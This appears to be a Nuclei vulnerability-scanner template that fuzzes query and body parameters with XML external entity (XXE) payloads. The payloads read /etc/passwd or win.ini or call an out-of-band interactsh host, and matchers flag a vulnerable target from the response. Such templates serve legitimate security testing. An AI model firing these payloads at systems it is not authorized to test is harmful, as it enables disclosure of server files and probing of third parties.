id: generic-xxe
info:
  name: Generic XML External Entity - (XXE)
  author: pwnhxl,AmirHossein Raeisi
  severity: medium
  reference:
    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
  metadata:
    max-request: 2
  tags: dast,vuln,xxe
variables:
  rletter: '{{rand_base(6,''abc'')}}'
http:
  - fuzzing:
      - fuzz:
          - '{{xxe}}'
        keys-regex:
          - (.*?)xml(.*?)
        parts:
          - query
          - body
      - fuzz:
          - '{{xxe}}'
        parts:
          - query
          - body
        values:
          - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
    matchers:
      - name: linux
        part: body
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'
        type: regex
      - name: windows
        part: body
        type: word
        words:
          - for 16-bit app support
      - part: interactsh_protocol
        type: word
        words:
          - http
          # digest: 4b0a004830460221008e9a08c31786b87fd798a33799dc0a887b3cfa5f1b3f6ec61f9edac8ccd44ff0022100fa1baca43da50ab72185027547e4870b3edf452902225cfcfd0f43b16a4938e4:922c64590222798bb761d5b6d8e72950
    payloads:
      xxe:
        - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{rletter}};</x>
        - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
        - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{rletter}};</x>
    pre-condition:
      - dsl:
          - method == "GET"
          - method == "POST"
          - method == "PUT"
        type: dsl
    stop-at-first-match: true
